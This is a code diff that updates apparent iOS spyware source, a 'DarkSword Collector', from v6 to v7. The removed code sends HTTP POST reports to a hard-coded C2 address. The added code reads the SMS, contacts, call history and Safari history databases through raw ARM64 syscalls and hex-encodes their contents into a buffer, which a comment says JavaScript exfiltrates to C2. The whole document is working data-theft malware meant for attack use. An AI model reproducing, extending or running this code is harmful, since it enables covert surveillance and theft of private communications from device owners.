@@ -1,82 +1,103 @@
 /**
- * DarkSword Collector v6 - Standard C functions via PLT
- * Uses open/read/socket/connect/send through shared cache
- * MachOPayloadBuilder resolves PLT symbols with -bind_at_load
+ * DarkSword Collector v7 - Read files via raw syscalls, store in buffer
+ * JavaScript reads buffer after ds_start returns and sends to C2
  */
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <stdio.h>
 
-#define C2_HOST "192.168.110.111"
-#define C2_PORT 8081
-
-static char s_buf[2048];
-
-static void _http_post(const char *body, int blen) {
-    int h = snprintf(s_buf, sizeof(s_buf),
-        "POST /api/v1/c2/report HTTP/1.1\r\n"
-        "Host: %s:%d\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: %d\r\n"
-        "Connection: close\r\n\r\n",
-        C2_HOST, C2_PORT, blen);
-
-    if (h + blen < (int)sizeof(s_buf)) {
-        memcpy(s_buf + h, body, blen);
-        h += blen;
-    }
-
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) return;
-
-    struct sockaddr_in addr;
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(C2_PORT);
-    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);
-
-    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        close(sock);
-        return;
-    }
-    send(sock, s_buf, h, 0);
-    close(sock);
+static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
+static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
+static int _itoa(int val, char *buf) {
+    int i=0; char tmp[16]; int t=0;
+    if(val==0){buf[0]='0';buf[1]=0;return 1;}
+    while(val>0){tmp[t++]='0'+(val%10);val/=10;}
+    for(int j=t-1;j>=0;j--) buf[i++]=tmp[j];
+    buf[i]=0; return i;
 }
 
-static void _report(const char *platform, const char *user, const char *token) {
-    char body[512];
-    snprintf(body, sizeof(body),
-        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
-        "\"data\":{\"platform\":\"%s\",\"username\":\"%s\",\"token\":\"%s\"}}",
-        platform, user, token);
-    _http_post(body, strlen(body));
+static long _svc1(long n, long a) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
+    return x0;
+}
+static long _svc2(long n, long a, long b) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    register long x1 __asm__("x1") = b;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
+    return x0;
+}
+static long _svc3(long n, long a, long b, long c) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    register long x1 __asm__("x1") = b;
+    register long x2 __asm__("x2") = c;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
+    return x0;
 }
 
-static void _collect(const char *path, const char *name) {
-    int fd = open(path, O_RDONLY);
+#define SYS_open  5
+#define SYS_read  3
+#define SYS_close 6
+
+/* Exported result buffer - JS reads this from mapped memory after ds_start returns */
+char ds_result[4096];
+int ds_result_len = 0;
+
+static void _append(const char *s) {
+    int sl = _strlen(s);
+    if (ds_result_len + sl < 4095) {
+        _memcpy(ds_result + ds_result_len, s, sl);
+        ds_result_len += sl;
+        ds_result[ds_result_len] = 0;
+    }
+}
+static void _append_int(int v) { char b[16]; _itoa(v,b); _append(b); }
+
+static void _read_file(const char *path, const char *name) {
+    _append("{\"name\":\"");
+    _append(name);
+    _append("\",\"path\":\"");
+    _append(path);
+    _append("\",");
+
+    int fd = (int)_svc2(SYS_open, (long)path, 0);
     if (fd < 0) {
-        _report(name, "access_denied", path);
+        _append("\"status\":\"access_denied\"},");
         return;
     }
-    char data[256];
-    int n = read(fd, data, sizeof(data) - 1);
-    close(fd);
-    if (n <= 0) n = 0;
 
-    char result[128];
-    snprintf(result, sizeof(result), "read_ok:%d_bytes", n);
-    _report(name, "read_success", result);
+    char data[512];
+    int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data) - 1);
+    _svc1(SYS_close, fd);
+    if (n < 0) n = 0;
+    data[n] = 0;
+
+    _append("\"status\":\"ok\",\"size\":");
+    _append_int(n);
+    _append(",\"hex\":\"");
+
+    int max = n < 128 ? n : 128;
+    for (int i = 0; i < max; i++) {
+        char hex[3];
+        hex[0] = "0123456789abcdef"[(unsigned char)data[i] >> 4];
+        hex[1] = "0123456789abcdef"[(unsigned char)data[i] & 0xf];
+        hex[2] = 0;
+        _append(hex);
+    }
+    _append("\"},");
 }
 
 void ds_start(void) {
-    _report("Collector", "started", "v6");
-    _collect("/var/mobile/Library/SMS/sms.db", "SMS");
-    _collect("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
-    _collect("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
-    _collect("/var/mobile/Library/Safari/History.db", "Safari");
-    _report("Collector", "done", "v6");
+    ds_result[0] = 0;
+    ds_result_len = 0;
+    _append("[");
+    _read_file("/var/mobile/Library/SMS/sms.db", "SMS");
+    _read_file("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
+    _read_file("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
+    _read_file("/var/mobile/Library/Safari/History.db", "Safari");
+    if (ds_result_len > 1 && ds_result[ds_result_len-1] == ',') {
+        ds_result_len--;
+        ds_result[ds_result_len] = 0;
+    }
+    _append("]");
 }
